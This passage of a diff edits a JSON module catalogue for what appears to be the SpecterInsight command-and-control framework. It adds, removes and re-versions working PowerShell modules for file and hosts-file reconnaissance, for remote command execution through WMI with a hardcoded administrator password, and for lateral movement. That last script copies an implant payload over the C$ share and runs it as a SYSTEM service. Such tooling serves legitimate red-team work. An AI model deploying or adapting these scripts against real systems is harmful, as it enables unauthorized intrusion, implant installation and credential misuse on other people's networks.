-    "documentation": "# Overview\r\n\r\nThis script lists files and folders in the specified directory. The operator can optionally apply a wildcard filter and chose whether or not to recursively search through subdirectories.\r\n\r\n# Dependencies\r\n\r\n- None\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n- Linux\r\n- Mac\r\n\r\n# Example Output\r\n\r\n```json\r\n[\r\n  {\r\n    \"Length\": 524288,\r\n    \"PSIsContainer\": false,\r\n    \"Extension\": \".sqlite\",\r\n    \"CreationTimeUtc\": \"2022-01-03T21:42:34.1395221Z\",\r\n    \"LastAccessTimeUtc\": \"2024-01-25T04:52:57.555101Z\",\r\n    \"LastWriteTimeUtc\": \"2024-01-25T04:52:57.555101Z\",\r\n    \"FullName\": \"C:\\\\Users\\\\helpdesk\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\96ihc82a.default-release\\\\cookies.sqlite\",\r\n    \"Session\": {\r\n      \"MachineId\": \"dfec7175a6a62757d83b93794df767d5acfadb82\",\r\n      \"SessionId\": \"324557e28ddd4ac89d0df41e9bb6a712\",\r\n      \"BuildId\": \"576c5025f1754fdabb6ff8e7d050caad\",\r\n      \"FQDN\": \"DESKTOP-LMCH70V\",\r\n      \"IP\": \"::ffff:192.168.1.101\",\r\n      \"OS\": \"Windows 10.0.19045\",\r\n      \"Username\": \"DESKTOP-LMCH70V\\\\helpdesk\",\r\n      \"PID\": 5652,\r\n      \"Path\": \"C:\\\\Users\\\\helpdesk\\\\Desktop\\\\Workspace\\\\576c5025f1754fdabb6ff8e7d050caad-csharp-load-module.exe\"\r\n    }\r\n  }\r\n]\r\n```",
-    "scriptBlock": "param(\r\n    [Parameter(Mandatory=$True, HelpMessage=\"The path to a file or directory.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Path = 'C:\\Users\\',\r\n\r\n    [Parameter(Mandatory=$True, HelpMessage=\"True to recursively list files and folders in subdirectories.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [bool]$Recurse = $false,\r\n\r\n    [Parameter(Mandatory=$True, HelpMessage=\"A wildcard filter to identify which file system entries to select.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Filter = \"*\"\r\n)\r\n\r\n$entries = Get-ChildItem -Path $Path -Filter $Filter -Recurse:$Recurse -ErrorAction SilentlyContinue;\r\n$entries | Select Length,PSIsContainer,Extension,CreationTimeUtc,LastAccessTimeUtc,LastWriteTimeUtc,FullName | Sort-Object LastWriteTimeUtc -Descending",
+    "identifier": "acb5b5f5b4ca44adb6a8d2227570dd00",
+    "name": "Get Host File Entries",
+    "description": "Gets the IP, domain name, and comments for each host entry.",
+    "documentation": "# Overview\r\n\r\nUses regular expressions to parse out information about each host entry. This may give some insight to various system names in the target environment.\r\n\r\n# Example Output\r\n\r\n```\r\nIP           HostName       Comment\r\n--           --------       -------\r\n102.54.94.97 rhino.acme.com\r\n```",
+    "scriptBlock": "$Hosts = Join-Path -Path $($env:windir) -ChildPath \"system32\\drivers\\etc\\hosts\"\r\n\r\n[regex]$nonwhitespace = \"\\S\"\r\n\r\n$HostsArray = Get-Content $Hosts | Where-Object { (($nonwhitespace.Match($_)).value -ne \"#\") -and ($_ -notmatch \"^\\s+$\") -and ($_.Length -gt 0) } # exlcude full-line comments and blank lines\r\n\r\n$ResultsArray = foreach($Entry in $HostsArray) {\r\n    $Entry -match \"(?<IP>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\\s+(?<HOSTNAME>\\S+)\" | Out-Null\r\n\r\n    $IP = $matches.IP\r\n    $HostName = $matches.HostName\r\n\r\n    if ($Entry.contains(\"#\")) {\r\n        $Comment = $Entry.substring($Entry.indexof(\"#\")+1)\r\n    }\r\n\r\n    New-Object psobject -Property @{\r\n        IP = $IP\r\n        HostName = $HostName\r\n        Comment = $Comment \r\n    }\r\n}\r\n\r\n$ResultsArray | Select-Object IP, HostName, Comment",
     "version": 1,
     "isPremium": true,
     "labels": [
-      "api",
-      "discovery",
-      "file-and-directory-discovery",
-      "linux",
-      "mac",
+      "passive",
+      "recon",
       "windows"
     ],
     "enabled": true
@@ -1119,6 +1148,24 @@
     "enabled": true
   },
   {
+    "identifier": "e78a44a9165b4482b72a52bc84c53fde",
+    "name": "List Files via API",
+    "description": "Lists files and folders in the specified directory.",
+    "documentation": "# Overview\r\n\r\nThis script lists files and folders in the specified directory. The operator can optionally apply a wildcard filter and chose whether or not to recursively search through subdirectories.\r\n\r\n# Dependencies\r\n\r\n- None\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n- Linux\r\n- Mac\r\n\r\n# Example Output\r\n\r\n```json\r\n[\r\n  {\r\n    \"Length\": 524288,\r\n    \"PSIsContainer\": false,\r\n    \"Extension\": \".sqlite\",\r\n    \"CreationTimeUtc\": \"2022-01-03T21:42:34.1395221Z\",\r\n    \"LastAccessTimeUtc\": \"2024-01-25T04:52:57.555101Z\",\r\n    \"LastWriteTimeUtc\": \"2024-01-25T04:52:57.555101Z\",\r\n    \"FullName\": \"C:\\\\Users\\\\helpdesk\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\96ihc82a.default-release\\\\cookies.sqlite\",\r\n    \"Session\": {\r\n      \"MachineId\": \"dfec7175a6a62757d83b93794df767d5acfadb82\",\r\n      \"SessionId\": \"324557e28ddd4ac89d0df41e9bb6a712\",\r\n      \"BuildId\": \"576c5025f1754fdabb6ff8e7d050caad\",\r\n      \"FQDN\": \"DESKTOP-LMCH70V\",\r\n      \"IP\": \"::ffff:192.168.1.101\",\r\n      \"OS\": \"Windows 10.0.19045\",\r\n      \"Username\": \"DESKTOP-LMCH70V\\\\helpdesk\",\r\n      \"PID\": 5652,\r\n      \"Path\": \"C:\\\\Users\\\\helpdesk\\\\Desktop\\\\Workspace\\\\576c5025f1754fdabb6ff8e7d050caad-csharp-load-module.exe\"\r\n    }\r\n  }\r\n]\r\n```",
+    "scriptBlock": "param(\r\n    [Parameter(Mandatory=$True, HelpMessage=\"The path to a file or directory.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Path = 'C:\\Users\\',\r\n\r\n    [Parameter(Mandatory=$True, HelpMessage=\"True to recursively list files and folders in subdirectories.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [bool]$Recurse = $false,\r\n\r\n    [Parameter(Mandatory=$True, HelpMessage=\"A wildcard filter to identify which file system entries to select.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Filter = \"*\"\r\n)\r\n\r\n$entries = Get-ChildItem -Path $Path -Filter $Filter -Recurse:$Recurse -ErrorAction SilentlyContinue;\r\n$entries | Select Length,PSIsContainer,Extension,CreationTimeUtc,LastAccessTimeUtc,LastWriteTimeUtc,FullName | Sort-Object LastWriteTimeUtc -Descending",
+    "version": 1,
+    "isPremium": true,
+    "labels": [
+      "api",
+      "discovery",
+      "file-and-directory-discovery",
+      "linux",
+      "mac",
+      "windows"
+    ],
+    "enabled": true
+  },
+  {
     "identifier": "0d7c5d8cd9314c789fcef2db3cda67fd",
     "name": "Get Computers in Active Directory",
     "description": "This script queries the local Active Directory instance for the FQDN and OS Version of each computer in Active Directory.",
@@ -1132,21 +1179,6 @@
       "discovery",
       "network-discovery",
       "remote-system-discovery"
-    ],
-    "enabled": true
-  },
-  {
-    "identifier": "3d9fd5526d644257801b1ddca9866ecf",
-    "name": "Remote Command via WMI",
-    "description": "The script will run a command on a remote system using the WMI API.",
-    "documentation": "# Overview\r\n\r\nThis script leverages the Windows Management Instrumentation API to run a command on a remote system using either impersonation of the current user or explicit credentials.\r\n\r\nWMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access with the latter leveraging the Distributed Component Object Model (DCOM). Remote WMI over DCOM operates using port 135.\r\n\r\n# Dependencies\r\n\r\n* None\r\n\r\n# Employment Considerations\r\n\r\n* Impersonation requires that the current user have access to the remote system.\r\n* You will not receive any output from the executed command using this mechanism.\r\n\r\n# Example Text Output\r\n\r\nExample of successful execution.\r\n\r\n```\r\n__GENUS          : 2\r\n__CLASS          : __PARAMETERS\r\n__SUPERCLASS     :\r\n__DYNASTY        : __PARAMETERS\r\n__RELPATH        :\r\n__PROPERTY_COUNT : 2\r\n__DERIVATION     : {}\r\n__SERVER         :\r\n__NAMESPACE      :\r\n__PATH           :\r\nProcessId        : 2288\r\nReturnValue      : 0\r\nPSComputerName   :\r\n```",
-    "scriptBlock": "param(\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the command.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the command.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Target,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The local or domain username to authenticate with.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Username,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The password for the specified user.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Password,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$True, HelpMessage=\"The command to run on the target system.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The command to run on the target system.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Command\r\n)\r\n\r\n#Execute command on remote system using WMI commandline executable\r\nif(![String]::IsNullOrEmpty($Username) -and $Password -ne $null) {\r\n    #Run with explicit credentials\r\n    $Username = \"administrator@lab.net\"\r\n    $Password = \"1qaz!QAZ\"\r\n    $SecurePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force\r\n    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword\r\n\r\n    Invoke-WmiMethod -Class \"WIN32_PROCESS\" -Name \"Create\" -ArgumentList $Command -ComputerName $Target -Credential $Credential\r\n} else {\r\n    #Run with impersonation\r\n    Invoke-WmiMethod -Class \"WIN32_PROCESS\" -Name \"Create\" -ArgumentList $Command -ComputerName $Target\r\n}",
-    "version": 3,
-    "isPremium": true,
-    "labels": [
-      "api",
-      "execution",
-      "lateral-movement"
     ],
     "enabled": true
   },
@@ -1167,6 +1199,21 @@
       "windows",
       "windows-command-shell",
       "windows-management-instrumentation"
+    ],
+    "enabled": true
+  },
+  {
+    "identifier": "3d9fd5526d644257801b1ddca9866ecf",
+    "name": "Remote Command via WMI",
+    "description": "The script will run a command on a remote system using the WMI API.",
+    "documentation": "# Overview\r\n\r\nThis script leverages the Windows Management Instrumentation API to run a command on a remote system using either impersonation of the current user or explicit credentials.\r\n\r\nWMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access with the latter leveraging the Distributed Component Object Model (DCOM). Remote WMI over DCOM operates using port 135.\r\n\r\n# Dependencies\r\n\r\n* None\r\n\r\n# Employment Considerations\r\n\r\n* Impersonation requires that the current user have access to the remote system.\r\n* You will not receive any output from the executed command using this mechanism.\r\n\r\n# Example Text Output\r\n\r\nExample of successful execution.\r\n\r\n```\r\n__GENUS          : 2\r\n__CLASS          : __PARAMETERS\r\n__SUPERCLASS     :\r\n__DYNASTY        : __PARAMETERS\r\n__RELPATH        :\r\n__PROPERTY_COUNT : 2\r\n__DERIVATION     : {}\r\n__SERVER         :\r\n__NAMESPACE      :\r\n__PATH           :\r\nProcessId        : 2288\r\nReturnValue      : 0\r\nPSComputerName   :\r\n```",
+    "scriptBlock": "param(\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the command.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the command.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Target,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The local or domain username to authenticate with.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Username,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The password for the specified user.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Password,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$True, HelpMessage=\"The command to run on the target system.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The command to run on the target system.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Command\r\n)\r\n\r\n#Execute command on remote system using WMI commandline executable\r\nif(![String]::IsNullOrEmpty($Username) -and $Password -ne $null) {\r\n    #Run with explicit credentials\r\n    $Username = \"administrator@lab.net\"\r\n    $Password = \"1qaz!QAZ\"\r\n    $SecurePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force\r\n    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword\r\n\r\n    Invoke-WmiMethod -Class \"WIN32_PROCESS\" -Name \"Create\" -ArgumentList $Command -ComputerName $Target -Credential $Credential\r\n} else {\r\n    #Run with impersonation\r\n    Invoke-WmiMethod -Class \"WIN32_PROCESS\" -Name \"Create\" -ArgumentList $Command -ComputerName $Target\r\n}",
+    "version": 3,
+    "isPremium": true,
+    "labels": [
+      "api",
+      "execution",
+      "lateral-movement"
     ],
     "enabled": true
   },
@@ -1201,26 +1248,6 @@
     "enabled": true
   },
   {
-    "identifier": "b0e972a962fb42aaa2f9e0c32a240bf7",
-    "name": "Lateral Movement Using Service Control Manager and Custom Binary (PSExec)",
-    "description": "This script loads a SpecterInsight implant onto the remote system by installing a custom service binary that reflectively loads a Specter.",
-    "documentation": "# Overview\r\n\r\nThis script leverages the Service Control Manager API to create and execute a remote service on the operator specified system using username and password. The custom service binary is run under the NT AUTHORITY\\SYSTEM account. The $Hostname parameter can be either hostname, FQDN, or IP.\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Dependencies\r\n\r\n- common\r\n- lateral\r\n\r\n# Pre-Requisites\r\n\r\n- Valid credentials for the target systems.\r\n- Service Control Manager\r\n- Firewall permissions to establish RPC connections\r\n- Server Service\r\n- Administrative Shares enabled\r\n- Firewall permissions allowing SMB connections",
-    "scriptBlock": "param(\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Target,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The local or domain username to authenticate with.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Username,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The password for the specified user.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Password,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Build]\r\n    [string]$Build,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The folder where the service directory will be created.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The folder where the service directory will be created.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]$Directory = \"C:\\Program Files\\\",\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The type of payload to drop.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The type of payload to drop.\")]\r\n    [ValidateSet(\"csharp_service_load_module\", \"csharp_service_powershell_host\")]\r\n    [string]$Payload = \"csharp_service_load_module\"\r\n)\r\n\r\nload common;\r\nload lateral;\r\n\r\n#Generate a new PowerShell cradle command\r\n$contents = payload -Build $Build -Kind $Payload;\r\n$config = payload -Build $Build -Kind 'csharp_config';\r\n\r\n#Get the filename of the payload\r\n$assembly = [System.Reflection.Assembly]::Load($contents);\r\n$filename = $assembly.GetName();\r\n$serviceName = $filename.Name + \"Svc\";\r\n\r\n#Define the remote paths\r\n$sharePath = \"\\\\$Target\\C`$\";\r\n$uncRootPath = [System.IO.Path]::Combine([System.IO.Path]::Combine($sharePath, $Directory.Replace(\"C:\\\", \"\")), $filename.Name);\r\n$uncBinaryPath = [System.IO.Path]::Combine($uncRootPath, $filename.Name + \".exe\");\r\n$localRootPath = [System.IO.Path]::Combine($Directory, $filename.Name);\r\n$localBinaryPath = [System.IO.Path]::Combine($localRootPath, $filename.Name + \".exe\");\r\n\r\n#Copy the payload to the remote system\r\ntry {\r\n    if([string]::IsNullOrEmpty($Username)) {\r\n        [void][System.IO.Directory]::CreateDirectory($uncRootPath);\r\n        [System.IO.File]::WriteAllBytes($uncBinaryPath, $contents);\r\n        [System.IO.File]::WriteAllText($uncBinaryPath + \".config\", $config);\r\n\r\n        #Create the service\r\n        Create-Service -ComputerName $Target -ServiceName $serviceName -Path $localBinaryPath;\r\n    } else {\r\n        $credentials = New-Object System.Net.NetworkCredential($Username, $Password);\r\n        $share = [common.IO.TemporaryNetworkShare]::Map($sharePath, $credentials);\r\n        try {\r\n            [void][System.IO.Directory]::CreateDirectory($uncRootPath);\r\n            [System.IO.File]::WriteAllBytes($uncBinaryPath, $contents);\r\n            [System.IO.File]::WriteAllText($uncBinaryPath + \".config\", $config);\r\n        } finally {\r\n            $share.Dispose();\r\n        }\r\n\r\n        #Create the service\r\n        Create-Service -ComputerName $Target -ServiceName $serviceName -Path $localBinaryPath -Username $Username -Password $Password;\r\n    }\r\n    $success = $true;\r\n} catch {\r\n    $success = $false;\r\n    throw;\r\n}\r\n\r\nNew-Object psobject -Property @{\r\n    Lateral = New-Object psobject -Property @{\r\n        Method = \"System Sevice\";\r\n        Path = $localBinaryPath;\r\n        ServiceName = $serviceName;\r\n        Payload = $Payload;\r\n        System = $Target;\r\n        Username = $Username;\r\n        Success = $success;\r\n    };\r\n};",
-    "version": 19,
-    "isPremium": true,
-    "labels": [
-      "api",
-      "create-or-modify-system-process",
-      "lateral-movement",
-      "service-execution",
-      "system-services",
-      "valid-accounts",
-      "windows",
-      "windows-service"
-    ],
-    "enabled": true
-  },
-  {
     "identifier": "f8206df7115a448082a914c1f2142d89",
     "name": "Get WiFi Passwords Commandline",
     "description": "Harvest saved WiFi passwords.",
@@ -1235,6 +1262,26 @@
       "passive",
       "windows",
       "windows-command-shell"
+    ],
+    "enabled": true
+  },
+  {
+    "identifier": "b0e972a962fb42aaa2f9e0c32a240bf7",
+    "name": "Lateral Movement Using Service Control Manager and Custom Binary (PSExec)",
+    "description": "This script loads a SpecterInsight implant onto the remote system by installing a custom service binary that reflectively loads a Specter.",
+    "documentation": "# Overview\r\n\r\nThis script leverages the Service Control Manager API to create and execute a remote service on the operator specified system using username and password. The custom service binary is run under the NT AUTHORITY\\SYSTEM account. The $Hostname parameter can be either hostname, FQDN, or IP.\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Dependencies\r\n\r\n- common\r\n- lateral\r\n\r\n# Pre-Requisites\r\n\r\n- Valid credentials for the target systems.\r\n- Service Control Manager\r\n- Firewall permissions to establish RPC connections\r\n- Server Service\r\n- Administrative Shares enabled\r\n- Firewall permissions allowing SMB connections",
+    "scriptBlock": "param(\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Target,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The local or domain username to authenticate with.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Username,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The password for the specified user.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Password,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Build]\r\n    [string]$Build,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The folder where the service directory will be created.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The folder where the service directory will be created.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]$Directory = \"C:\\Program Files\\\",\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The type of payload to drop.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The type of payload to drop.\")]\r\n    [ValidateSet(\"csharp_service_load_module\", \"csharp_service_powershell_host\")]\r\n    [string]$Payload = \"csharp_service_load_module\"\r\n)\r\n\r\nload common;\r\nload lateral;\r\n\r\n#Generate a new PowerShell cradle command\r\n$contents = payload -Build $Build -Kind $Payload;\r\n$config = payload -Build $Build -Kind 'csharp_config';\r\n\r\n#Get the filename of the payload\r\n$assembly = [System.Reflection.Assembly]::Load($contents);\r\n$filename = $assembly.GetName();\r\n$serviceName = $filename.Name + \"Svc\";\r\n\r\n#Define the remote paths\r\n$sharePath = \"\\\\$Target\\C`$\";\r\n$uncRootPath = [System.IO.Path]::Combine([System.IO.Path]::Combine($sharePath, $Directory.Replace(\"C:\\\", \"\")), $filename.Name);\r\n$uncBinaryPath = [System.IO.Path]::Combine($uncRootPath, $filename.Name + \".exe\");\r\n$localRootPath = [System.IO.Path]::Combine($Directory, $filename.Name);\r\n$localBinaryPath = [System.IO.Path]::Combine($localRootPath, $filename.Name + \".exe\");\r\n\r\n#Copy the payload to the remote system\r\ntry {\r\n    if([string]::IsNullOrEmpty($Username)) {\r\n        [void][System.IO.Directory]::CreateDirectory($uncRootPath);\r\n        [System.IO.File]::WriteAllBytes($uncBinaryPath, $contents);\r\n        [System.IO.File]::WriteAllText($uncBinaryPath + \".config\", $config);\r\n\r\n        #Create the service\r\n        Create-Service -ComputerName $Target -ServiceName $serviceName -Path $localBinaryPath -NoStart:$false;\r\n    } else {\r\n        $credentials = New-Object System.Net.NetworkCredential($Username, $Password);\r\n        $share = [common.IO.TemporaryNetworkShare]::Map($sharePath, $credentials);\r\n        try {\r\n            [void][System.IO.Directory]::CreateDirectory($uncRootPath);\r\n            [System.IO.File]::WriteAllBytes($uncBinaryPath, $contents);\r\n            [System.IO.File]::WriteAllText($uncBinaryPath + \".config\", $config);\r\n        } finally {\r\n            $share.Dispose();\r\n        }\r\n\r\n        #Create the service\r\n        Create-Service -ComputerName $Target -ServiceName $serviceName -Path $localBinaryPath -Username $Username -Password $Password -NoStart:$false;\r\n    }\r\n    $success = $true;\r\n} catch {\r\n    $success = $false;\r\n    throw;\r\n}\r\n\r\nNew-Object psobject -Property @{\r\n    Lateral = New-Object psobject -Property @{\r\n        Method = \"System Sevice\";\r\n        Path = $localBinaryPath;\r\n        ServiceName = $serviceName;\r\n        Payload = $Payload;\r\n        System = $Target;\r\n        Username = $Username;\r\n        Success = $success;\r\n    };\r\n};",
+    "version": 21,
+    "isPremium": true,
+    "labels": [
+      "api",
+      "create-or-modify-system-process",
+      "lateral-movement",
+      "service-execution",
+      "system-services",
+      "valid-accounts",
+      "windows",
+      "windows-service"
     ],
     "enabled": true
   }
